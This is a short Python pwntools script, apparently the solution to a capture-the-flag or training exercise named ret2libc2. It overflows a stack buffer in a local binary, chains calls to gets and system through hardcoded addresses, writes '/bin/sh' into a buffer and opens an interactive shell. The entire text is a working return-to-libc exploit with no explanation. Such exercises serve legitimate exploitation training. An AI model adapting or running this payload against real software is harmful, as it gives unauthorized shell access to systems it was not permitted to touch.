from pwn import *

offset = 0x6c + 4

sh = process(r"../ex1/ret2libc2")
addr_system = 0x08048490
addr_gets = 0x08048460
addr_buf2 = 0x0804a080
payload = b'A'*offset + p32(addr_gets) + p32(addr_system) + p32(addr_buf2) + p32(addr_buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
